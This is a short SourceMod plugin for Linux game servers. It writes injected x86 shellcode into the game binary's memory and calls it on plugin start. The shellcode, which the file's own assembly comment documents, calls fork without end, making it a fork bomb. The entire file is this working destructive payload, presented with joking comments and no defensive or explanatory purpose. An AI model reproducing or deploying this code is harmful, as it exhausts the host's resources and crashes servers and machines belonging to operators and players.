// I'm too lazy to do commenting or any code styling.
// Linux-only.

#include <sourcemod>
#include <sdktools>

// start:
//   mov eax, 2
//   int 0x80
//   jmp start
static const char buffer[] = "\xB8\x02\x00\x00\x00\xCD\x80\xEB\xF7";

static void AllocateSubroutine(Address address, const char[] subroutine, int maxlength)
{
	for (int i = 0; i < maxlength; ++i)
		StoreToAddress(address + view_as<Address>(i), subroutine[i], NumberType_Int8);
}

public void OnPluginStart()
{
    // Load gamedata.
    GameData config = new GameData("sm_fork");
    if (!config)
        SetFailState("epic fail for sm_fork.txt");
    Address imageBase = config.GetMemSig("ImageBase");
    if (!imageBase)
        SetFailState("epic fail for os (this only works on linux)");
    delete config;
    
    // Do incredible stuff.
    Address addr = imageBase + view_as<Address>(0x4);
    AllocateSubroutine(addr, buffer, sizeof(buffer) - 1);
    StartPrepSDKCall(SDKCall_Static);
    PrepSDKCall_SetAddress(addr);
    Handle fork = EndPrepSDKCall();

    // its over
    SDKCall(fork);
}